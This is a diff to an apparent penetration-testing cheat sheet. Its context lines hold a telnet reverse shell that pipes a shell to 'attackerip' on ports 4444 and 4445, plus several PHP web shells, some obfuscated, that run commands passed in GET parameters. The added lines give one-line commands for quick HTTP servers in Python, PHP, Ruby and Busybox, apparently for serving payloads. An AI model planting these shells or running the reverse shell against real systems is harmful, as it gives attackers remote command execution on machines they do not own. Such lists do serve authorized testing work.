@@ -48,3 +48,10 @@ Telnet----telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Rememb
 PHP (standard)----<?php echo system($_GET['h00p']);?>
 PHP (tiniest)----<?=`{${~a0b8baab}[a0]}`;
 PHP (conditional tiniest)----<?`$_GET[_]`;
+
+##HTTP Servers
+Python2----python -m SimpleHTTPServer 8888
+Python3----python -m http.server --bind 0.0.0.0 8888
+php----php -S 0.0.0.0:8888
+Ruby----ruby -run -e httpd . -p 8888
+Busybox----busybox httpd -f -p 8888
